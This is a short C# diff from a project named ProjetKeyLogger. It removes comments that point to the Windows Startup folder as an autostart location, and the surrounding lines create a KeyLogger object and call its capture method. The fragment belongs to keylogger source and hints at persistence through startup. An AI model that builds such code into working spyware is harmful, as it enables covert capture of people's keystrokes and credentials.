@@ -25,11 +25,6 @@ namespace ProjetKeyLogger
             //Ouverture du pdf
             pdf.Start();*/
 
-
-            //Dossier des programme a demarer automatiquement
-            //C:/Users/Charlie/AppData/Roaming/Microsoft/Windows/start Menu/Programs/Startup
-
-
             //création de l'objet KeyLogger
             KeyLogger key_logger = new KeyLogger();
             key_logger.capture();
